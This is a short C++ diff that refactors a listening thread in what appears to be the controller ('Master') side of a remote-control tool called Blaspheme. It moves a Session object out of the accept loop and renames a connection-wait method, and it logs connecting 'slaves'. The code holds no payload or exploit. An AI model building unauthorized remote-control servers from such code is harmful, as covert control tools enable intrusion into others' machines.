@@ -13,7 +13,7 @@ using namespace Blaspheme;
 namespace Master
 {
 	ListeningThread::ListeningThread(int port_value, const QString& pass_value, QObject * parent)
-		:QThread(parent), continue_listen(false), session(0)
+		:QThread(parent), continue_listen(false)
 	{
 		changeListeningPort(port_value);
 		changePassword(pass_value);
@@ -30,10 +30,11 @@ namespace Master
         LOG << "Starting listening thread, connections activated";
         try
         {
+			Session session(info);
             while(continue_listen)
             {
-				Session session;
-				if(session.wait_connect(info))
+				
+				if(session.waitConnect())
 				{
 					LOG << "New slave connected";
 					emit newSlaveConnected(session);
